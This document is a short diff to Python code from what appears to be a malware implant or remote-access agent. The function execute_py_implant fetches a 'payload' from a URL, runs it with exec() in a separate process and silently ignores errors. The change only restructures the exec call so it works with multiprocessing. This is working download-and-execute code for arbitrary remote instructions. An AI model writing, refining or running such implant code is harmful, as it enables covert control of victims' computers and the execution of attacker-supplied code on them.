@@ -5,13 +5,17 @@ import os
 from multiprocessing import Process
 import base64
 
+def exec_py():
+    global payload
+    exec(payload)
+
 def execute_py_implant(url,session):
     response = session.get(url,headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
     if response.status_code == 200:
+        global payload
         payload = response.text
         try:
-            x = lambda:exec(payload)
-            a = Process(target=x)
+            a = Process(target=exec_py)
             a.start()
         except:
             pass
